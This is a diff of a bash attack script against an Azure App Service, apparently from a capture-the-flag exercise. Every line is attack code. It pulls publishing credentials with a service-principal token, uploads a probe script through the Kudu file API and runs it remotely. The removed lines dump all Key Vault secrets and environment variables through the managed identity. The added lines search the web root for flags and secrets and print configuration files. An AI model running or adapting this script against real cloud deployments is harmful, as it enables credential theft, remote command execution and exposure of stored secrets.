@@ -14,23 +14,19 @@ ARM=$(sp_tok "$RS_ID" "$RS_SEC" "https://management.azure.com")
 BASE="https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Web/sites/$SITE"
 PUB=$(curl -s -X POST "$BASE/config/publishingcredentials/list?api-version=2022-03-01" -H "Authorization: Bearer $ARM" -d '')
 KU=$(echo "$PUB" | jq -r '.properties.publishingUserName'); KP=$(echo "$PUB" | jq -r '.properties.publishingPassword')
-echo "KU=$KU KP_LEN=${#KP}"
 SCM="https://$SITE.scm.azurewebsites.net"
 cat > probe.sh <<'PROBE'
-AT=$(curl -s "$IDENTITY_ENDPOINT?resource=https://vault.azure.net&api-version=2019-08-01" -H "X-IDENTITY-HEADER: $IDENTITY_HEADER" | grep -o '"access_token":"[^"]*"' | cut -d'"' -f4)
-echo "VTLEN=${#AT}"
-LIST=$(curl -s "https://kv-tbl-sec-x3euoz.vault.azure.net/secrets?api-version=7.4" -H "Authorization: Bearer $AT")
-echo "LIST=$LIST"
-for sid in $(echo "$LIST" | grep -o '"id":"[^"]*"' | cut -d'"' -f4); do
-  echo "VAL $sid ="
-  curl -s "$sid?api-version=7.4" -H "Authorization: Bearer $AT"
-  echo
-done
-printenv | sort
+echo "=== tree ==="
+ls -laR /home/site/wwwroot 2>/dev/null | head -120
+echo "=== grep ==="
+grep -rniE 'flag|cyberjutsu|df26|dfctf|paydojo|secret|kv-tbl-sec' /home/site/wwwroot 2>/dev/null | head -60
+echo "=== flag files ==="
+find /home -maxdepth 5 -iname '*flag*' 2>/dev/null
+echo "=== python src ==="
+for f in $(find /home/site/wwwroot -maxdepth 2 -name '*.py' -o -maxdepth 2 -name '*.env' -o -maxdepth 2 -name '*.json' -o -maxdepth 2 -name '*.cfg' 2>/dev/null); do echo "--- $f"; cat "$f"; echo; done
 PROBE
-echo "=== vfs put ==="
+echo "KU=$KU KP_LEN=${#KP}"
 curl -s -u "$KU:$KP" -X PUT "$SCM/api/vfs/site/wwwroot/probe.sh" -H "If-Match: *" --data-binary @probe.sh -o /dev/null -w "PUT=%{http_code}\n"
-echo "=== run probe ==="
-curl -s -u "$KU:$KP" -X POST "$SCM/api/command" -H "Content-Type: application/json" -d "{\"command\":\"bash /home/site/wwwroot/probe.sh\",\"dir\":\"/home\"}" | head -c 9000
+curl -s -u "$KU:$KP" -X POST "$SCM/api/command" -H "Content-Type: application/json" -d "{\"command\":\"bash /home/site/wwwroot/probe.sh\",\"dir\":\"/home\"}" | head -c 12000
 echo
 echo "ALL_DONE"
